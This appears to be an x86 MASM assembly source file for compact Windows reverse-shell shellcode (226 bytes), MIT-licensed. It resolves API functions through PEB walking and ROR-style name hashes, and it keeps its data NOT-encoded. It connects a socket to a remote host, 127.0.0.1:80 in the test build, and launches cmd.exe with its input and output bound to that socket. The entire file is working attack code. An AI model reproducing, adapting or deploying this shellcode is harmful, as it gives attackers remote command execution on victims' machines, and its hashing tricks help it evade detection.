 ;
 ;  The MIT License:
 ;
 ;  Copyright (c) 2008, 2013 Kevin Devine
 ;
 ;  Permission is hereby granted,  free of charge,  to any person obtaining a
 ;  copy of this software and associated documentation files (the "Software"),
 ;  to deal in the Software without restriction,  including without limitation
 ;  the rights to use,  copy,  modify,  merge,  publish,  distribute,
 ;  sublicense,  and/or sell copies of the Software,  and to permit persons to
 ;  whom the Software is furnished to do so,  subject to the following
 ;  conditions:
 ;
 ;  The above copyright notice and this permission notice shall be included in
 ;  all copies or substantial portions of the Software.
 ;
 ;  THE SOFTWARE IS PROVIDED "AS IS",  WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 ;  IMPLIED,  INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 ;  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 ;  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM,  DAMAGES OR OTHER
 ;  LIABILITY,  WHETHER IN AN ACTION OF CONTRACT,  TORT OR OTHERWISE,
 ;  ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
 ;  OTHER DEALINGS IN THE SOFTWARE.
 ;
 
  ; Testing: jwasm -DTEST_CODE -I .\WinInc208\include -coff rev_overlap32.asm
  ;          link /subsystem:console rev_overlap32.obj
  ;
  ; Binary:  jwasm -I .\WinInc208\include -bin rev_tiny32.asm
  ;
  ; Size: 226 bytes
  ;
  .686
  .model flat, stdcall

  includelib ws2_32.lib
  includelib kernel32.lib

  option casemap:none

  .nolist
  .nocref

  WIN32_LEAN_AND_MEAN equ 1

  include windows.inc
  include winsock2.inc

  .list
  .cref

  REMOTE_IP    equ 00100007Fh  ; 127.0.0.1
  REMOTE_PORT  equ 80
  ROL_CONSTANT equ 7

  mrol macro iNum:req, iBits:req
    exitm <((iNum shl iBits) and 0FFFFFFFFh) or (iNum shr (32-iBits))>
  endm

  ;USE_16 equ 1
  
  hashapi macro szApi
    local dwApi

    dwApi = 0

    forc x, szApi
      if '&x' ne '"'
        dwApi = mrol((dwApi + '&x'), ROL_CONSTANT) xor '&x'
      endif
    endm
    dwApi = mrol(dwApi, ROL_CONSTANT)
    ifdef USE_16
      dw (dwApi and 0FFFFh)
    else
      dd (dwApi and 0FFFFFFFFh)
    endif
  endm

  mhtons macro A:req
    exitm <(((A and 0FF00h) shr 8) or \
           (((A and 000FFh) shl 8))) and 0FFFFh>
  endm

  PUSHAD_STRUCT struc
    _edi  dd  ?
    _esi  dd  ?
    _ebp  dd  ?
    _esp  dd  ?
    _ebx  dd  ?
    _edx  dd  ?
    _ecx  dd  ?
    _eax  dd  ?
  PUSHAD_STRUCT ends

  IN4_ADDR  struct 
    union S_un
      struct S_un_b
        s_b1  u_char  ?
        s_b2  u_char  ?
        s_b3  u_char  ?
        s_b4  u_char  ?
      ends
    struct S_un_w
      s_w1  u_short ?
      s_w2  u_short ?
    ends
      S_addr  u_long  ?
    ends
  IN4_ADDR  ends

  PIN_ADDR typedef ptr IN_ADDR
  LPIN_ADDR typedef ptr IN_ADDR

  sockaddr_in4  struct 
    sin_family  SWORD ?
    sin_port    WORD  ?
    sin_addr    IN4_ADDR  <>
    ;sin_zero    SBYTE 8 dup (?)
  sockaddr_in4  ends
  
  ifdef TEST_CODE
    .data
      wsa          WSADATA             <>
      process_info PROCESS_INFORMATION <>
      startup_info STARTUPINFO         <>
      cmd_line     db "cmd", 0
  
    includelib kernel32.lib
    includelib ws2_32.lib
  endif
  
  .code

entrypoint:
ifdef TEST_CODE
    mov    eax, code_end - code_start

    push   offset wsa
    push   MAKEWORD(2, 0)
    call   WSAStartup

    call   code_start

    push   eax
    call   ExitProcess
endif
code_start:
    pushad
    jmp    load_data
calc_position:
    pop    esi
    lea    ebp, [esi + (offset get_proc_address - offset data_section)]
    xor    eax, eax
    cdq
    mov    dl, sizeof (STARTUPINFO) + 4*5 ; 4 params to WSASocketA + ptr to "cmd"

    sub    esp, edx
    mov    edi, esp
    mov    ecx, edx
    rep    stosb

    push   SOCK_STREAM
    push   AF_INET
    call   ebp          ; WSASocketA, 4 params removed
    xchg   eax, ebx
    
    mov    edi, esp
    push   16
    push   edi
    push   ebx
    lodsd             
    not    eax
    stosd           ; store sin_family + sin_port
    lodsd
    not    eax      ; store sin_addr
    stosd
    call   ebp      ; connect
    
    mov    edi, esp
    push   sizeof (STARTUPINFO) 
    pop    dword ptr [edi][STARTUPINFO.cb]
    mov    dword ptr [edi][STARTUPINFO.lpReserved], eax
    inc    dword ptr [edi][STARTUPINFO.dwFlags+1]
    xchg   eax, ebx
    lea    edi, [edi][STARTUPINFO.hStdInput]
    stosd
    stosd
    stosd
    xchg   eax, ebx
    
    mov    eax, not 'dmc'
    not    eax
    cdq
    mov    ecx, edi
    stosd
    mov    eax, esp
    
    push   eax       ; lpProcessInformation
    push   eax       ; lpStartupInfo
    push   edx       ; lpCurrentDirectory=NULL
    push   edx       ; lpEnvironment=NULL
    push   edx       ; dwCreationFlags=0
    push   ecx       ; bInheritHandles=TRUE
    push   edx       ; lpThreadAttributes=NULL
    push   edx       ; lpProcessAttributes=NULL
    push   ecx       ; lpCommandLine
    push   edx       ; lpApplicationName
    call   ebp       ; CreateProcessA
   
    mov    eax, [esp]
    push   INFINITE
    push   eax
    call   ebp       ; WaitForSingleObject
   
    push   ebx   
    call   ebp       ; closesocket
    
    ; fix up stack/registers and return
    add    esp, sizeof (STARTUPINFO) + 4
    popad
    ret
    
load_data:
    call calc_position
; not really data section as we're in same segment
data_section label dword
    hashapi "WSASocketA"
ifdef TEST_CODE
; 127.0.0.1:80
    remote_addr sockaddr_in4 <not AF_INET, \
                  not mhtons(REMOTE_PORT), \
      <<<not 7fh, not 00h, not 00h, not 01h>>>>
else
    remote_addr sockaddr_in4 <>
endif
    hashapi "connect"
    hashapi "CreateProcessA"
    hashapi "WaitForSingleObject"
    hashapi "closesocket"

get_proc_address proc near
    assume fs:nothing
    
    lodsd
    pushad
    push   30h
    pop    esi
    lods   dword ptr fs:[esi]
    mov    eax, [eax+0Ch]
    mov    esi, [eax+1Ch]
load_dll:
    mov    ebp, [esi+08h]
    lodsd
    push   eax

    mov    eax, [ebp+3Ch]
    mov    eax, [ebp+eax+78h] 
    lea    esi, [ebp+eax+18h]
    lodsd
    xchg   eax, ecx
    jecxz  load_dll

    lodsd
    add    eax, ebp
    push   eax

    lodsd
    lea    edi, [ebp+eax]

    lodsd
    lea    ebx, [ebp+eax]
load_api:
    mov    esi, [edi+4*ecx-4]
    add    esi, ebp
    xor    eax, eax
    cdq
hash_api:
    lodsb
    add    edx, eax
    rol    edx, ROL_CONSTANT
    xor    edx, eax
    dec    eax
    jns    hash_api
    
    cmp    edx, dword ptr[esp+8][PUSHAD_STRUCT._eax]
    loopne load_api
    
    pop    eax
    pop    esi
    jne    load_dll

    movzx  edx, word ptr [ebx+2*ecx]
    add    ebp, [eax+4*edx]
    mov    [esp][PUSHAD_STRUCT._eax], ebp
    popad
    jmp    eax
get_proc_address endp

code_end label dword

      end entrypoint
